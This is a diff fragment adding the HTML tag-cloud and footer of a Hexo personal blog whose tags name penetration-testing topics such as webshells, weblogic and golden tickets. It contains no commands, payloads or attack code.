href="/imemaker/imemaker.github.io/tags/mysql%E8%8E%B7%E5%8F%96webshell/" style="font-size: 10px;" class="tags-cloud-0">mysql获取webshell</a> <a href="/imemaker/imemaker.github.io/tags/phpmyadmin/" style="font-size: 10px;" class="tags-cloud-0">phpmyadmin</a> <a href="/imemaker/imemaker.github.io/tags/sc%E5%91%BD%E4%BB%A4/" style="font-size: 10px;" class="tags-cloud-0">sc命令</a> <a href="/imemaker/imemaker.github.io/tags/struts2/" style="font-size: 10px;" class="tags-cloud-0">struts2</a> <a href="/imemaker/imemaker.github.io/tags/thinkphp5-rce/" style="font-size: 10px;" class="tags-cloud-0">thinkphp5-rce</a> <a href="/imemaker/imemaker.github.io/tags/tomcat/" style="font-size: 10px;" class="tags-cloud-0">tomcat</a> <a href="/imemaker/imemaker.github.io/tags/usage/" style="font-size: 10px;" class="tags-cloud-0">usage</a> <a href="/imemaker/imemaker.github.io/tags/weblogic/" style="font-size: 12px;" class="tags-cloud-2">weblogic</a> <a href="/imemaker/imemaker.github.io/tags/why/" style="font-size: 10px;" class="tags-cloud-0">why</a> <a href="/imemaker/imemaker.github.io/tags/windows-linux%E9%98%B2%E7%81%AB%E5%A2%99/" style="font-size: 10px;" class="tags-cloud-0">windows/linux防火墙</a> <a href="/imemaker/imemaker.github.io/tags/windows%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 10px;" class="tags-cloud-0">windows命令执行</a> <a href="/imemaker/imemaker.github.io/tags/%E4%BB%A4%E7%89%8C%E4%BC%AA%E9%80%A0/" style="font-size: 10px;" class="tags-cloud-0">令牌伪造</a> <a href="/imemaker/imemaker.github.io/tags/%E4%BF%A1%E6%81%AF%E5%9B%9E%E6%98%BE/" style="font-size: 10px;" class="tags-cloud-0">信息回显</a> <a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E5%A4%9A%E5%B1%82%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/" style="font-size: 10px;" class="tags-cloud-0">内网多层网络代理</a> <a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1/" style="font-size: 10px;" class="tags-cloud-0">内网服务</a> <a href="/imemaker/imemaker.github.io/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA/" style="font-size: 18px;" class="tags-cloud-8">内网靶机</a> <a href="/imemaker/imemaker.github.io/tags/%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83/" style="font-size: 10px;" class="tags-cloud-0">域内提权</a> <a href="/imemaker/imemaker.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 20px;" class="tags-cloud-10">渗透测试</a> <a href="/imemaker/imemaker.github.io/tags/%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" style="font-size: 10px;" class="tags-cloud-0">白银票据</a> <a href="/imemaker/imemaker.github.io/tags/%E8%84%8F%E7%89%9B/" style="font-size: 10px;" class="tags-cloud-0">脏牛</a> <a href="/imemaker/imemaker.github.io/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" style="font-size: 16px;" class="tags-cloud-6">黄金票据</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/imemaker" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+      
+    </div>
+     
+    <p>&copy; 2022 <a href="/" target="_blank">E-Maker</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/imemaker/imemaker.github.io/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
